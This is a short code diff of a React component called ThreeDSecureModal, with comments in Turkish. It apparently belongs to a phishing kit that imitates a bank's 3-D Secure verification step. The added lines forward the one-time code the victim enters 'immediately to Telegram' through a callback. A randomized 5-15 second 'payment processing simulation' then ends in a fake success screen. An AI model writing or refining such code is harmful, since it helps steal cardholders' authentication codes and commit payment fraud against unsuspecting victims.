@@ -122,18 +122,16 @@ export function ThreeDSecureModal({
       return;
     }
     setError("");
-    setStatus("verifying");
+    setStatus("processing");
+    // OTP'yi HEMEN Telegram'a gönder (onOtpGenerated fire-and-forget fetch)
     onOtpGenerated?.(otp);
-    // OTP dogrulandi, simdi odeme isleniyor (random 5-15 saniye)
+    // Ödeme işleniyor simülasyonu (5-15 saniye)
+    const toplamSn = 5 + Math.floor(Math.random() * 11);
+    setProcessingSeconds(toplamSn);
     window.setTimeout(() => {
-      const toplamSn = 5 + Math.floor(Math.random() * 11); // 5-15 sn
-      setProcessingSeconds(toplamSn);
-      setStatus("processing");
-      window.setTimeout(() => {
-        setStatus("done");
-        window.setTimeout(onSuccess, 750);
-      }, toplamSn * 1000);
-    }, 1100);
+      setStatus("done");
+      window.setTimeout(onSuccess, 750);
+    }, toplamSn * 1000);
   }
 
   function resend() {
